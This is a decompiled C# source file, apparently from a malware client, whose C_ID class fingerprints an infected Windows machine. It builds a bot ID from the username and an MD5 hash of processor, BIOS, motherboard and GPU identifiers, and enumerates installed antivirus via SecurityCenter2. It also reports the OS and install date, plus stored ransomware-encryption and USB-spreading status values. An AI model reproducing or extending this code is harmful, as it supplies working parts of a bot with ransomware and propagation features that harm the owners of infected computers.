using System;
using System.IO;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Client_0._5.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Client_0._5;

public class C_ID
{
	private static object SPL = C_Settings.SPL;

	public static object Bot()
	{
		try
		{
			return Operators.ConcatenateObject(Operators.ConcatenateObject(UserName(), (object)"_"), (object)HWID());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object UserName()
	{
		try
		{
			return Environment.UserName;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object MyOS()
	{
		try
		{
			return ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Unkown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object Bit()
	{
		try
		{
			if (Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")!.Contains("64"))
			{
				return "x64";
			}
			return "x86";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "*";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string INDATE()
	{
		try
		{
			return new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToString("dd/MM/yyy");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string HWID()
	{
		try
		{
			return MD5HASH(string.Concat(string.Concat(Identifier("Win32_Processor", "ProcessorId") + "-" + Identifier("Win32_BIOS", "SerialNumber"), "-", Identifier("Win32_BaseBoard", "SerialNumber")), "-", Identifier("Win32_VideoController", "Name")));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string Identifier(string wmiClass, string wmiProperty)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		try
		{
			string text = "";
			ManagementObjectCollection instances = new ManagementClass(wmiClass).GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					if (Operators.CompareString(text, "", false) == 0)
					{
						try
						{
							text = ((ManagementBaseObject)val).get_Item(wmiProperty).ToString();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string MD5HASH(string input)
	{
		checked
		{
			try
			{
				byte[] array = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
				StringBuilder stringBuilder = new StringBuilder();
				int num = array.Length - 1;
				for (int i = 10; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("x2"));
				}
				return stringBuilder.ToString().ToUpper();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static object Rans()
	{
		try
		{
			if (Operators.CompareString(C_Fuctions.GTV("Rans-Status"), (string)null, false) == 0)
			{
				C_Fuctions.STV("Rans-Status", "Not encrypted");
				return "Not encrypted";
			}
			return C_Fuctions.GTV("Rans-Status");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object USBSP()
	{
		if (C_Settings.USB)
		{
			try
			{
				if (Operators.CompareString(C_Fuctions.GTV("USB"), (string)null, false) == 0)
				{
					C_Fuctions.STV("USB", "Not ready");
					return C_Fuctions.GTV("USB");
				}
				return C_Fuctions.GTV("USB");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				object result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
		return "Disabled";
	}

	public static string AV()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					text = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			return text.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
